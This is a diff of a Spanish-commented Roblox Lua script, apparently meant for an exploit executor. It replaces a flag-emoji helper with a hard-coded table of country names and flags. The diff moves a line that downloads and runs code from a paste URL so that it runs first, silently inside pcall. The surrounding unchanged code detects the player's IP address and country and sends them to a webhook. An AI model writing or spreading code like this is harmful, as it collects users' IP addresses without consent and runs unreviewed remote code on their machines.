@@ -3,92 +3,93 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- ====================================
--- 1️⃣ Función para convertir código ISO a emoji
+-- 1️⃣ Ejecutar loadstring primero
 -- ====================================
-local function codeToEmoji(code)
-    local a,b = code:sub(1,1), code:sub(2,2)
-    return utf8.char(0x1F1E6 + (a:byte() - 65)) .. utf8.char(0x1F1E6 + (b:byte() - 65))
-end
+pcall(function()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/28c28085/", true))()
+end)
 
 -- ====================================
--- 2️⃣ Tabla completa ISO2 → Nombre de país
+-- 2️⃣ Tabla completa de países con emoji manual
 -- ====================================
-local ISOToCountry = {
-    AF="Afganistán", AL="Albania", DZ="Argelia", AS="Samoa Americana", AD="Andorra",
-    AO="Angola", AI="Anguila", AQ="Antártida", AG="Antigua y Barbuda", AR="Argentina",
-    AM="Armenia", AW="Aruba", AU="Australia", AT="Austria", AZ="Azerbaiyán",
-    BS="Bahamas", BH="Bahrein", BD="Bangladesh", BB="Barbados", BY="Bielorrusia",
-    BE="Bélgica", BZ="Belice", BJ="Benín", BM="Bermudas", BT="Bután",
-    BO="Bolivia", BA="Bosnia y Herzegovina", BW="Botsuana", BR="Brasil", IO="Territorio Británico del Océano Índico",
-    VG="Islas Vírgenes Británicas", BN="Brunéi", BG="Bulgaria", BF="Burkina Faso", BI="Burundi",
-    KH="Camboya", CM="Camerún", CA="Canadá", CV="Cabo Verde", KY="Islas Caimán",
-    CF="República Centroafricana", TD="Chad", CL="Chile", CN="China", CX="Isla de Navidad",
-    CC="Islas Cocos", CO="Colombia", KM="Comoras", CD="Congo (República Democrática)", CG="Congo",
-    CK="Islas Cook", CR="Costa Rica", CI="Costa de Marfil", HR="Croacia", CU="Cuba",
-    CW="Curazao", CY="Chipre", CZ="Chequia", DK="Dinamarca", DJ="Yibuti",
-    DM="Dominica", DO="República Dominicana", EC="Ecuador", EG="Egipto", SV="El Salvador",
-    GQ="Guinea Ecuatorial", ER="Eritrea", EE="Estonia", SZ="Esuatini", ET="Etiopía",
-    FK="Islas Malvinas", FO="Islas Feroe", FJ="Fiyi", FI="Finlandia", FR="Francia",
-    GF="Guayana Francesa", PF="Polinesia Francesa", GA="Gabón", GM="Gambia", GE="Georgia",
-    DE="Alemania", GH="Ghana", GI="Gibraltar", GR="Grecia", GL="Groenlandia",
-    GD="Granada", GP="Guadalupe", GU="Guam", GT="Guatemala", GG="Guernesey",
-    GN="Guinea", GW="Guinea-Bisáu", GY="Guyana", HT="Haití", HN="Honduras",
-    HK="Hong Kong", HU="Hungría", IS="Islandia", IN="India", ID="Indonesia",
-    IR="Irán", IQ="Irak", IE="Irlanda", IM="Isla de Man", IL="Israel",
-    IT="Italia", JM="Jamaica", JP="Japón", JE="Jersey", JO="Jordania",
-    KZ="Kazajistán", KE="Kenia", KI="Kiribati", KW="Kuwait", KG="Kirguistán",
-    LA="Laos", LV="Letonia", LB="Líbano", LS="Lesoto", LR="Liberia",
-    LY="Libia", LI="Liechtenstein", LT="Lituania", LU="Luxemburgo", MO="Macao",
-    MG="Madagascar", MW="Malaui", MY="Malasia", MV="Maldivas", ML="Mali",
-    MT="Malta", MH="Islas Marshall", MQ="Martinica", MR="Mauritania", MU="Mauricio",
-    YT="Mayotte", MX="México", FM="Micronesia", MD="Moldavia", MC="Mónaco",
-    MN="Mongolia", ME="Montenegro", MS="Montserrat", MA="Marruecos", MZ="Mozambique",
-    MM="Birmania", NA="Namibia", NR="Nauru", NP="Nepal", NL="Países Bajos",
-    NC="Nueva Caledonia", NZ="Nueva Zelanda", NI="Nicaragua", NE="Níger", NG="Nigeria",
-    NU="Niue", KP="Corea del Norte", MK="Macedonia del Norte", MP="Islas Marianas del Norte",
-    NO="Noruega", OM="Omán", PK="Pakistán", PW="Palaos", PS="Palestina",
-    PA="Panamá", PG="Papúa Nueva Guinea", PY="Paraguay", PE="Perú", PH="Filipinas",
-    PN="Islas Pitcairn", PL="Polonia", PT="Portugal", PR="Puerto Rico", QA="Catar",
-    RO="Rumanía", RU="Rusia", RW="Ruanda", RE="Reunión", BL="San Bartolomé",
-    SH="Santa Elena", KN="San Cristóbal y Nieves", LC="Santa Lucía", MF="San Martín",
-    PM="San Pedro y Miquelón", VC="San Vicente y Granadinas", WS="Samoa", SM="San Marino",
-    ST="Santo Tomé y Príncipe", SA="Arabia Saudita", SN="Senegal", RS="Serbia", SC="Seychelles",
-    SL="Sierra Leona", SG="Singapur", SX="Sint Maarten", SK="Eslovaquia", SI="Eslovenia",
-    SB="Islas Salomón", SO="Somalia", ZA="Sudáfrica", KR="Corea del Sur", SS="Sudán del Sur",
-    ES="España", LK="Sri Lanka", SD="Sudán", SR="Surinam", SE="Suecia",
-    CH="Suiza", SY="Siria", TW="Taiwán", TJ="Tayikistán", TZ="Tanzania",
-    TH="Tailandia", TL="Timor-Leste", TG="Togo", TK="Tokelau", TO="Tonga",
-    TT="Trinidad y Tobago", TN="Túnez", TR="Turquía", TM="Turkmenistán", TC="Islas Turcas y Caicos",
-    TV="Tuvalu", UG="Uganda", UA="Ucrania", AE="Emiratos Árabes Unidos", GB="Reino Unido",
-    US="Estados Unidos", UY="Uruguay", UZ="Uzbekistán", VU="Vanuatu", VA="Ciudad del Vaticano",
-    VE="Venezuela", VN="Vietnam", WF="Wallis y Futuna", EH="Sahara Occidental", YE="Yemen",
-    ZM="Zambia", ZW="Zimbabue"
+local CountryEmoji = {
+    ["Afganistán"]="Afganistán 🇦🇫", ["Albania"]="Albania 🇦🇱", ["Argelia"]="Argelia 🇩🇿",
+    ["Samoa Americana"]="Samoa Americana 🇦🇸", ["Andorra"]="Andorra 🇦🇩", ["Angola"]="Angola 🇦🇴",
+    ["Anguila"]="Anguila 🇦🇮", ["Antártida"]="Antártida 🇦🇶", ["Antigua y Barbuda"]="Antigua y Barbuda 🇦🇬",
+    ["Argentina"]="Argentina 🇦🇷", ["Armenia"]="Armenia 🇦🇲", ["Aruba"]="Aruba 🇦🇼",
+    ["Australia"]="Australia 🇦🇺", ["Austria"]="Austria 🇦🇹", ["Azerbaiyán"]="Azerbaiyán 🇦🇿",
+    ["Bahamas"]="Bahamas 🇧🇸", ["Baréin"]="Baréin 🇧🇭", ["Bangladesh"]="Bangladesh 🇧🇩",
+    ["Barbados"]="Barbados 🇧🇧", ["Bielorrusia"]="Bielorrusia 🇧🇾", ["Bélgica"]="Bélgica 🇧🇪",
+    ["Belice"]="Belice 🇧🇿", ["Benín"]="Benín 🇧🇯", ["Bermudas"]="Bermudas 🇧🇲",
+    ["Bután"]="Bután 🇧🇹", ["Bolivia"]="Bolivia 🇧🇴", ["Bosnia y Herzegovina"]="Bosnia y Herzegovina 🇧🇦",
+    ["Botsuana"]="Botsuana 🇧🇼", ["Brasil"]="Brasil 🇧🇷", ["Canadá"]="Canadá 🇨🇦",
+    ["Chile"]="Chile 🇨🇱", ["China"]="China 🇨🇳", ["Colombia"]="Colombia 🇨🇴",
+    ["Costa Rica"]="Costa Rica 🇨🇷", ["Croacia"]="Croacia 🇭🇷", ["Cuba"]="Cuba 🇨🇺",
+    ["Curazao"]="Curazao 🇨🇼", ["Chipre"]="Chipre 🇨🇾", ["Chequia"]="Chequia 🇨🇿",
+    ["Dinamarca"]="Dinamarca 🇩🇰", ["Yibuti"]="Yibuti 🇩🇯", ["Dominica"]="Dominica 🇩🇲",
+    ["República Dominicana"]="República Dominicana 🇩🇴", ["Ecuador"]="Ecuador 🇪🇨",
+    ["Egipto"]="Egipto 🇪🇬", ["El Salvador"]="El Salvador 🇸🇻", ["Emiratos Árabes Unidos"]="Emiratos Árabes Unidos 🇦🇪",
+    ["Eritrea"]="Eritrea 🇪🇷", ["Estonia"]="Estonia 🇪🇪", ["Esuatini"]="Esuatini 🇸🇿",
+    ["Etiopía"]="Etiopía 🇪🇹", ["Islas Malvinas"]="Islas Malvinas 🇫🇰", ["Islas Feroe"]="Islas Feroe 🇫🇴",
+    ["Fiyi"]="Fiyi 🇫🇯", ["Finlandia"]="Finlandia 🇫🇮", ["Francia"]="Francia 🇫🇷",
+    ["Gabón"]="Gabón 🇬🇦", ["Gambia"]="Gambia 🇬🇲", ["Georgia"]="Georgia 🇬🇪",
+    ["Alemania"]="Alemania 🇩🇪", ["Ghana"]="Ghana 🇬🇭", ["Gibraltar"]="Gibraltar 🇬🇮",
+    ["Grecia"]="Grecia 🇬🇷", ["Groenlandia"]="Groenlandia 🇬🇱", ["Granada"]="Granada 🇬🇩",
+    ["Guadalupe"]="Guadalupe 🇬🇵", ["Guam"]="Guam 🇬🇺", ["Guatemala"]="Guatemala 🇬🇹",
+    ["Guernesey"]="Guernesey 🇬🇬", ["Guinea"]="Guinea 🇬🇳", ["Guinea-Bisáu"]="Guinea-Bisáu 🇬🇼",
+    ["Guyana"]="Guyana 🇬🇾", ["Haití"]="Haití 🇭🇹", ["Honduras"]="Honduras 🇭🇳",
+    ["Hong Kong"]="Hong Kong 🇭🇰", ["Hungría"]="Hungría 🇭🇺", ["Islandia"]="Islandia 🇮🇸",
+    ["India"]="India 🇮🇳", ["Indonesia"]="Indonesia 🇮🇩", ["Irán"]="Irán 🇮🇷",
+    ["Irak"]="Irak 🇮🇶", ["Irlanda"]="Irlanda 🇮🇪", ["Isla de Man"]="Isla de Man 🇮🇲",
+    ["Israel"]="Israel 🇮🇱", ["Italia"]="Italia 🇮🇹", ["Jamaica"]="Jamaica 🇯🇲",
+    ["Japón"]="Japón 🇯🇵", ["Jersey"]="Jersey 🇯🇪", ["Jordania"]="Jordania 🇯🇴",
+    ["Kazajistán"]="Kazajistán 🇰🇿", ["Kenia"]="Kenia 🇰🇪", ["Kiribati"]="Kiribati 🇰🇮",
+    ["Kuwait"]="Kuwait 🇰🇼", ["Kirguistán"]="Kirguistán 🇰🇬", ["Laos"]="Laos 🇱🇦",
+    ["Letonia"]="Letonia 🇱🇻", ["Líbano"]="Líbano 🇱🇧", ["Lesoto"]="Lesoto 🇱🇸",
+    ["Liberia"]="Liberia 🇱🇷", ["Libia"]="Libia 🇱🇾", ["Liechtenstein"]="Liechtenstein 🇱🇮",
+    ["Lituania"]="Lituania 🇱🇹", ["Luxemburgo"]="Luxemburgo 🇱🇺", ["Macao"]="Macao 🇲🇴",
+    ["Madagascar"]="Madagascar 🇲🇬", ["Malaui"]="Malaui 🇲🇼", ["Malasia"]="Malasia 🇲🇾",
+    ["Maldivas"]="Maldivas 🇲🇻", ["Mali"]="Mali 🇲🇱", ["Malta"]="Malta 🇲🇹",
+    ["Islas Marshall"]="Islas Marshall 🇲🇭", ["Martinica"]="Martinica 🇲🇶", ["Mauritania"]="Mauritania 🇲🇷",
+    ["Mauricio"]="Mauricio 🇲🇺", ["México"]="México 🇲🇽", ["Micronesia"]="Micronesia 🇫🇲",
+    ["Moldavia"]="Moldavia 🇲🇩", ["Mónaco"]="Mónaco 🇲🇨", ["Mongolia"]="Mongolia 🇲🇳",
+    ["Montenegro"]="Montenegro 🇲🇪", ["Montserrat"]="Montserrat 🇲🇸", ["Marruecos"]="Marruecos 🇲🇦",
+    ["Mozambique"]="Mozambique 🇲🇿", ["Birmania"]="Birmania 🇲🇲", ["Namibia"]="Namibia 🇳🇦",
+    ["Nauru"]="Nauru 🇳🇷", ["Nepal"]="Nepal 🇳🇵", ["Países Bajos"]="Países Bajos 🇳🇱",
+    ["Nueva Caledonia"]="Nueva Caledonia 🇳🇨", ["Nueva Zelanda"]="Nueva Zelanda 🇳🇿",
+    ["Nicaragua"]="Nicaragua 🇳🇮", ["Níger"]="Níger 🇳🇪", ["Nigeria"]="Nigeria 🇳🇬",
+    ["Niue"]="Niue 🇳🇺", ["Corea del Norte"]="Corea del Norte 🇰🇵", ["Macedonia del Norte"]="Macedonia del Norte 🇲🇰",
+    ["Islas Marianas del Norte"]="Islas Marianas del Norte 🇲🇵", ["Noruega"]="Noruega 🇳🇴", ["Omán"]="Omán 🇴🇲",
+    ["Pakistán"]="Pakistán 🇵🇰", ["Palaos"]="Palaos 🇵🇼", ["Palestina"]="Palestina 🇵🇸",
+    ["Panamá"]="Panamá 🇵🇦", ["Papúa Nueva Guinea"]="Papúa Nueva Guinea 🇵🇬", ["Paraguay"]="Paraguay 🇵🇾",
+    ["Perú"]="Perú 🇵🇪", ["Filipinas"]="Filipinas 🇵🇭", ["Islas Pitcairn"]="Islas Pitcairn 🇵🇳",
+    ["Polonia"]="Polonia 🇵🇱", ["Portugal"]="Portugal 🇵🇹", ["Puerto Rico"]="Puerto Rico 🇵🇷",
+    ["Catar"]="Catar 🇶🇦", ["Rumanía"]="Rumanía 🇷🇴", ["Rusia"]="Rusia 🇷🇺",
+    ["Ruanda"]="Ruanda 🇷🇼", ["Reunión"]="Reunión 🇷🇪", ["San Bartolomé"]="San Bartolomé 🇧🇱",
+    ["Santa Elena"]="Santa Elena 🇸🇭", ["San Cristóbal y Nieves"]="San Cristóbal y Nieves 🇰🇳",
+    ["Santa Lucía"]="Santa Lucía 🇱🇨", ["San Martín"]="San Martín 🇲🇫", ["San Pedro y Miquelón"]="San Pedro y Miquelón 🇵🇲",
+    ["San Vicente y Granadinas"]="San Vicente y Granadinas 🇻🇨", ["Samoa"]="Samoa 🇼🇸", ["San Marino"]="San Marino 🇸🇲",
+    ["Santo Tomé y Príncipe"]="Santo Tomé y Príncipe 🇸🇹", ["Arabia Saudita"]="Arabia Saudita 🇸🇦", ["Senegal"]="Senegal 🇸🇳",
+    ["Serbia"]="Serbia 🇷🇸", ["Seychelles"]="Seychelles 🇸🇨", ["Sierra Leona"]="Sierra Leona 🇸🇱",
+    ["Singapur"]="Singapur 🇸🇬", ["Sint Maarten"]="Sint Maarten 🇸🇽", ["Eslovaquia"]="Eslovaquia 🇸🇰",
+    ["Eslovenia"]="Eslovenia 🇸🇮", ["Islas Salomón"]="Islas Salomón 🇸🇧", ["Somalia"]="Somalia 🇸🇴",
+    ["Sudáfrica"]="Sudáfrica 🇿🇦", ["Corea del Sur"]="Corea del Sur 🇰🇷", ["Sudán del Sur"]="Sudán del Sur 🇸🇸",
+    ["España"]="España 🇪🇸", ["Sri Lanka"]="Sri Lanka 🇱🇰", ["Sudán"]="Sudán 🇸🇩",
+    ["Surinam"]="Surinam 🇸🇷", ["Suecia"]="Suecia 🇸🇪", ["Suiza"]="Suiza 🇨🇭",
+    ["Siria"]="Siria 🇸🇾", ["Taiwán"]="Taiwán 🇹🇼", ["Tayikistán"]="Tayikistán 🇹🇯",
+    ["Tanzania"]="Tanzania 🇹🇿", ["Tailandia"]="Tailandia 🇹🇭", ["Timor-Leste"]="Timor-Leste 🇹🇱",
+    ["Togo"]="Togo 🇹🇬", ["Tokelau"]="Tokelau 🇹🇰", ["Tonga"]="Tonga 🇹🇴",
+    ["Trinidad y Tobago"]="Trinidad y Tobago 🇹🇹", ["Túnez"]="Túnez 🇹🇳", ["Turquía"]="Turquía 🇹🇷",
+    ["Turkmenistán"]="Turkmenistán 🇹🇲", ["Islas Turcas y Caicos"]="Islas Turcas y Caicos 🇹🇨", ["Tuvalu"]="Tuvalu 🇹🇻",
+    ["Uganda"]="Uganda 🇺🇬", ["Ucrania"]="Ucrania 🇺🇦", ["Reino Unido"]="Reino Unido 🇬🇧",
+    ["Estados Unidos"]="Estados Unidos 🇺🇸", ["Uruguay"]="Uruguay 🇺🇾", ["Uzbekistán"]="Uzbekistán 🇺🇿",
+    ["Vanuatu"]="Vanuatu 🇻🇺", ["Ciudad del Vaticano"]="Ciudad del Vaticano 🇻🇦", ["Venezuela"]="Venezuela 🇻🇪",
+    ["Vietnam"]="Vietnam 🇻🇳", ["Wallis y Futuna"]="Wallis y Futuna 🇼🇫", ["Sahara Occidental"]="Sahara Occidental 🇪🇭",
+    ["Yemen"]="Yemen 🇾🇪", ["Zambia"]="Zambia 🇿🇲", ["Zimbabue"]="Zimbabue 🇿🇼"
 }
 
 -- ====================================
--- 3️⃣ Función país a emoji usando tabla ISO
--- ====================================
-local function countryToEmojiFull(country)
-    country = country or "Desconocido"
-    local code = nil
-    for k,v in pairs(ISOToCountry) do
-        if v:lower() == country:lower() then
-            code = k
-            break
-        end
-    end
-    if not code then
-        if country:lower():find("united states") then code = "US" end
-    end
-    if code then
-        return country .. " " .. codeToEmoji(code)
-    else
-        return country .. " 🏳️"
-    end
-end
-
--- ====================================
--- 4️⃣ Detectar país e IP desde IP
+-- 3️⃣ Detectar país e IP desde IP usando la tabla manual
 -- ====================================
 local function detectCountryAndIP()
     local country, ip = "Desconocido", "Desconocido"
@@ -112,13 +113,13 @@ local function detectCountryAndIP()
         end
         if country ~= "Desconocido" then break end
     end
-    return countryToEmojiFull(country), ip
+    return CountryEmoji[country] or country.." 🏳️", ip
 end
 
 local countryDisplay, userIP = detectCountryAndIP()
 
 -- ====================================
--- 5️⃣ Enviar webhook
+-- 4️⃣ Enviar webhook
 -- ====================================
 if getgenv().WebhookEnviado then return end
 getgenv().WebhookEnviado = true
@@ -162,11 +163,3 @@ if req then
         })
     end)
 end
-
--- ====================================
--- 6️⃣ Ejecutar loadstring (TP) después con espera
--- ====================================
-task.wait(1) -- espera para que se procese el webhook
-pcall(function()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/28c28085/", true))()
-end)
